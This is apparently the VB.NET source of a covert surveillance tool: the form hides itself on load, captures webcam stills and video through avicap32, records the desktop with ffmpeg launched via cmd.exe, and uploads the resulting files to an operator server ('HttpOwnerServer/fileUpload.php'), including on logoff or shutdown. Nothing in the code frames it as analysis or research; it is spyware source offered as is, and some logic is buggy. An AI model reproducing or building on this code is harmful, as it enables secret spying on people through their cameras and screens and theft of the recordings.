Imports System.Runtime.InteropServices
Public Class Main
    Dim DATOS As IDataObject
    Dim IMAGEN As Image
    Dim isWebCamActive As Boolean = False
    Dim isWebCamRecording As Boolean = False
    Dim isScreenRecording As Boolean = False
    Public Const WM_CAP As Short = &H400S
    Public Const WM_CAP_DLG_VIDEOFORMAT As Integer = WM_CAP + 41
    Public Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
    Public Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
    Public Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30
    Public Const WM_CAP_SEQUENCE As Integer = WM_CAP + 62
    Public Const WM_CAP_FILE_SAVEAS As Integer = WM_CAP + 23
    Public Const WM_CAP_SET_PREVIEW As Integer = WM_CAP + 50
    Public Const WM_CAP_SET_PREVIEWRATE As Integer = WM_CAP + 52
    Public Const WM_CAP_SET_SCALE As Integer = WM_CAP + 53
    Public Const WS_CHILD As Integer = &H40000000
    Public Const WS_VISIBLE As Integer = &H10000000
    Public Const SWP_NOMOVE As Short = &H2S
    Public Const SWP_NOSIZE As Short = 1
    Public Const SWP_NOZORDER As Short = &H4S
    Public Const HWND_BOTTOM As Short = 1
    Public Const WM_CAP_STOP As Integer = WM_CAP + 68
    Public iDevice As Integer = 0 ' Current device ID
    Public hHwnd As Integer
    Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
        (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer,
        <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer
    Public Declare Function SetWindowPos Lib "user32" Alias "SetWindowPos" (ByVal hwnd As Integer,
        ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer,
        ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Public Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean
    Public Declare Function capCreateCaptureWindowA Lib "avicap32.dll" _
        (ByVal lpszWindowName As String, ByVal dwStyle As Integer,
        ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer,
        ByVal nHeight As Short, ByVal hWndParent As Integer,
        ByVal nID As Integer) As Integer
    Public Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short,
        ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String,
        ByVal cbVer As Integer) As Boolean
    Public Sub OpenPreviewWindow()
        If Not isWebCamActive Then
            hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, 480, Me.Handle.ToInt32, 0)
            Dim CAMARA As Integer = Nothing
            Try
                For I = 0 To 10
                    CAMARA = SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0)
                    If CAMARA > 0 Then
                        SendMessage(hHwnd, WM_CAP_SET_SCALE, True, 0)
                        SendMessage(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)
                        SendMessage(hHwnd, WM_CAP_SET_PREVIEW, True, 0)
                        SetWindowPos(hHwnd, HWND_BOTTOM, 0, 0, 800, 600,
                                SWP_NOMOVE Or SWP_NOZORDER)
                        Exit For
                    End If
                Next
                isWebCamActive = True
            Catch ex As Exception
                DestroyWindow(hHwnd)
                AddToLog("OpenPreviewWindow@Main", "Error: " & ex.Message, True)
                End
            End Try
        End If
    End Sub

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub UploadFileToServer(ByVal filePath As String)
        Try
            If filePath.ToLower <> "null" Or filePath <> Nothing Then
                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
                End
            End If
        Catch ex As Exception
            AddToLog("UploadFileToServer@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
            If isWebCamRecording Then
                UploadFileToServer(StopCamRecord())
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
        End Try
    End Sub
#Region "WebCam Service"
    Function TakeCamPicture() As String
        Try
            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
            If My.Computer.FileSystem.FileExists(filePath) Then
                My.Computer.FileSystem.DeleteFile(filePath)
            End If
            SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
            DATOS = Clipboard.GetDataObject()
            IMAGEN = CType(DATOS.GetData(GetType(System.Drawing.Bitmap)), Image)
            IMAGEN.Save(filePath, Imaging.ImageFormat.Png)
            Return filePath
        Catch ex As Exception
            AddToLog("TakeCamPicture@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Function StartCamRecord() As String
        Try
            If Not isWebCamRecording Then
                SendMessage(hHwnd, WM_CAP_DLG_VIDEOFORMAT, 0, 0)
                SendMessage(hHwnd, WM_CAP_SEQUENCE, 0, 0)
                isWebCamRecording = True
            End If
            Return 0
        Catch ex As Exception
            AddToLog("StartCamRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Function StopCamRecord() As String
        Try
            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
            If isWebCamRecording Then
                SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
                SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
                Try
                    If My.Computer.FileSystem.FileExists("C:\CAPTURE.avi") Then
                        My.Computer.FileSystem.DeleteFile("C:\CAPTURE.avi")
                    End If
                Catch
                End Try
                isWebCamRecording = False
            End If
            Return filePath
        Catch ex As Exception
            AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
#End Region
#Region "Screen Service"
    Function StartScreenRecord() As String
        Try
            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_ScreenVideo.mkv"
            If Not isScreenRecording Then
                Process.Start("cmd.exe", "/k ffmpeg -f gdigrab -framerate 25 -i desktop " & filePath)
                isScreenRecording = True
            End If
            Return 0
        Catch ex As Exception
            AddToLog("StartScreenRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Function StopScreenRecord() As String
        Try
            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_ScreenVideo.mkv"
            If isWebCamRecording Then
                SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
                SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
            End If
            Return filePath
        Catch ex As Exception
            AddToLog("StopScreenRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
#End Region
End Class